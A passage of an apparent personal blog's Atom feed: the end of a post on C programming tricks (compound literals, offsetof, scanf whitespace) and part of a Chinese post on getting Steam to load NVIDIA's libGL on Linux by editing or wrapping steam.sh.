+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;llist&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;llist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;};&lt;/span&gt;
+    &lt;span class=&quot;cp&quot;&gt;#define cons(x,y) (struct llist[]){ {x,y} }
+&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;llist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))));&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;llist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;include-data-file-as-header-inside-array-initializer&quot;&gt;Include data file as header inside array initializer&lt;/h2&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;normals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[][]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;cp&quot;&gt;#include &quot;normals.txt&quot;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h2 id=&quot;using-__file__-and-__line__-for-debugging&quot;&gt;Using &lt;code class=&quot;highlighter-rouge&quot;&gt;__FILE__&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;__LINE__&lt;/code&gt; for debugging&lt;/h2&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#define WHERE fprintf(stderr,&quot;[LOG]%s:%d\n&quot;,__FILE__,__LINE__);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h2 id=&quot;dynamically-sized-objectmodified&quot;&gt;Dynamically sized object(modified)&lt;/h2&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;X&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hello world&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;X&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offsetof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;X&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;hello world&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;offsetof()&lt;/code&gt; 本身也是一个比较有趣的宏定义(?)。&lt;/p&gt;
+
+&lt;h2 id=&quot;an-example-of-offsetof&quot;&gt;An example of &lt;code class=&quot;highlighter-rouge&quot;&gt;offsetof()&lt;/code&gt;&lt;/h2&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#define offsetof(st, m) ((size_t)(&amp;amp;((st *)0)-&amp;gt;m))&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;This works by casting a null pointer into a pointer to structure st, and then obtaining the address of member m within said structure. While this implementation works correctly in many compilers, it has undefined behavior according to the C standard,[2] since it involves a dereference of a null pointer (although, one might argue that no dereferencing takes place, because the whole expression is calculated at compile time). It also tends to produce confusing compiler diagnostics if one of the arguments is misspelled.&lt;/p&gt;
+
+&lt;h2 id=&quot;blank-in-a-scanf-format&quot;&gt;Blank in a &lt;code class=&quot;highlighter-rouge&quot;&gt;scanf()&lt;/code&gt; format&lt;/h2&gt;
+&lt;p&gt;In a &lt;code class=&quot;highlighter-rouge&quot;&gt;scanf()&lt;/code&gt; format, a blank, tab or newline means ‘skip white space if there is any to skip’. It does not directly ‘clear the input buffer’, but it does eat any white space which looks similar to clearing the input buffer (but is quite distinct from that). If you’re on Windows, using &lt;code class=&quot;highlighter-rouge&quot;&gt;fflush(stdin)&lt;/code&gt; clears the input buffer (of white space and non-white space characters); on Unix and according to the C standard, &lt;code class=&quot;highlighter-rouge&quot;&gt;fflush(stdin)&lt;/code&gt; is undefined behaviour.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getchar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'\n'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* becomes: */&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; %c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;http://stackoverflow.com/questions/599365/what-is-your-favorite-c-programming-trick&quot;&gt;What is your favorite C programming trick? - StackOverflow&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Offsetof&quot;&gt;offsetof() - Wikipedia&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://stackoverflow.com/questions/18491390/difference-between-scanfc-c-and-scanf-c-c&quot;&gt;Difference between scanf(“%c”, &amp;amp;c) and scanf(“ %c”, &amp;amp;c) - StackOverflow&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+  &lt;p&gt;&lt;a href=&quot;https://cubl.in/blog/2015/05/c-programming-tricks/&quot;&gt;C Programming Tricks&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubl.in&quot;&gt;/home/cubarco&lt;/a&gt; on May 02, 2015.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[解决用 ldconfig 指定 libgl 库时 Steam 的异常]]></title>
+  <link rel="alternate" type="text/html" href="https://cubl.in/blog/2015/01/ldconfig-and-steam-workaround/" />
+  <id>https://cubl.in/blog/2015/01/ldconfig-and-steam-workaround</id>
+  <updated>2015-03-07T00:00:00-00:00</updated>
+  <published>2015-01-28T00:00:00+00:00</published>
+  
+  <author>
+    <name>Cubarco</name>
+    <uri>https://cubl.in</uri>
+    <email>i at cubl.in</email>
+  </author>
+  <content type="html">&lt;p&gt;刚考完试，有点无聊，开 Steam 准备玩点游戏，结果发现之前的一个脚本不能用了。我的机器的情况是 Intel 集显 + NVIDIA 独显。两个显卡的切换一直是件很蛋疼的事情，optirun什么的性能实在太差，如果一直独显直出，耗电也是个大问题。这个学期初和 @hyrathb juju 一起研究了一下，用 ldconfig 尽可能减少切换显卡带来的麻烦(就是先关X, 然后跑个脚本开独显直出的X, 如果需要这个解决方案我可以单独po文).&lt;/p&gt;
+
+&lt;h4 id=&quot;steam-的坑&quot;&gt;Steam 的坑&lt;/h4&gt;
+&lt;p&gt;Steam 为了&lt;code class=&quot;highlighter-rouge&quot;&gt;Need to add /usr/lib32 to the library path to pick up libvdpau_nvidia.so on Ubuntu 12.04&lt;/code&gt;把&lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/lib32&lt;/code&gt;加进了&lt;code class=&quot;highlighter-rouge&quot;&gt;LD_LIBRARY_PATH&lt;/code&gt;变量，结果虽然在 ldconfig 中本来是 NVIDIA 的 libgl 库优先，但是&lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/lib32&lt;/code&gt;里面默认 mesa 的 libgl 库的链接却被优先加载了。导致 Steam 启动时会报&lt;code class=&quot;highlighter-rouge&quot;&gt;Not direct rendering&lt;/code&gt;之类的错误。&lt;/p&gt;
+
+&lt;h4 id=&quot;之前的解决办法&quot;&gt;之前的解决办法&lt;/h4&gt;
+&lt;p&gt;这个学期初是顺便解决了这个问题的，当时就是把 steam.sh 里面如下这行注释掉。&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;LD_LIBRARY_PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LD_LIBRARY_PATH&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:/usr/lib32&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;但是 Steam 会在启动时检查文件完整性，第一次检查是检查大小，所以把文件删掉一个字节就好了。不过要在启动 Steam 后换回原文件，因为 Steam 会第二次检查文件完整性，这次大概是检查哈希值。我是写了个脚本，准备两个文件，原文件和修改后的文件，cp 两次。不过最近升级后，第一次检查的好像也是哈希值了。检查的那些步骤估计都是写进二进制的，想绕过也比较麻烦，这脚本就没救了。&lt;/p&gt;
+
+&lt;h4 id=&quot;新发现&quot;&gt;新发现&lt;/h4&gt;
+&lt;p&gt;这次仔细读了一下 steam.sh, 这一块代码还是可以好好利用一下的:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;c&quot;&gt;# and launch steam&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;STEAM_DEBUGGER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$DEBUGGER&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;unset &lt;/span&gt;DEBUGGER &lt;span class=&quot;c&quot;&gt;# Don't use debugger if Steam launches itself recursively&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$STEAM_DEBUGGER&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;gdb&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$STEAM_DEBUGGER&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;cgdb&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
+
+
+    &lt;span class=&quot;c&quot;&gt;# Set the LD_PRELOAD varname in the debugger, and unset the global version.&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LD_PRELOAD&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
+        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo set env &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;LD_PRELOAD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LD_PRELOAD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ARGSFILE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;show &lt;span class=&quot;nb&quot;&gt;env &lt;/span&gt;LD_PRELOAD &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ARGSFILE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;unset &lt;/span&gt;LD_PRELOAD
+    &lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
+
+    &lt;span class=&quot;nv&quot;&gt;$STEAM_DEBUGGER&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ARGSFILE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--args&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$STEAMROOT&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$STEAMEXEPATH&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$@&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ARGSFILE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$STEAM_DEBUGGER&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;valgrind&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
+    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;DONT_BREAK_ON_ASSERT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;G_SLICE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;always-malloc &lt;span class=&quot;nv&quot;&gt;G_DEBUG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;gc-friendly valgrind &lt;span class=&quot;nt&quot;&gt;--error-limit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;no &lt;span class=&quot;nt&quot;&gt;--undef-value-errors&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;no &lt;span class=&quot;nt&quot;&gt;--suppressions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PLATFORM&lt;/span&gt;/steam.supp &lt;span class=&quot;nv&quot;&gt;$STEAM_VALGRIND&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$STEAMROOT&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$STEAMEXEPATH&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$@&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; 2&amp;gt;&amp;amp;1 | &lt;span class=&quot;nb&quot;&gt;tee &lt;/span&gt;steam_valgrind.txt
+&lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$STEAM_DEBUGGER&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;callgrind&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
+    &lt;/span&gt;valgrind &lt;span class=&quot;nt&quot;&gt;--tool&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;callgrind &lt;span class=&quot;nt&quot;&gt;--instr-atstart&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;no &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$STEAMROOT&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$STEAMEXEPATH&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$@&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$STEAM_DEBUGGER&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;strace&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
+    &lt;/span&gt;strace &lt;span class=&quot;nt&quot;&gt;-osteam&lt;/span&gt;.strace &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$STEAMROOT&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$STEAMEXEPATH&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$@&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$STEAM_DEBUGGER&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$STEAMROOT&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$STEAMEXEPATH&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$@&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;只要&lt;code class=&quot;highlighter-rouge&quot;&gt;DEBUGGER&lt;/code&gt;环境变量不匹配给定的字符串，最后 Steam 就会以下述方式执行:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$STEAM_DEBUGGER&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$STEAMROOT&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$STEAMEXEPATH&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$@&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
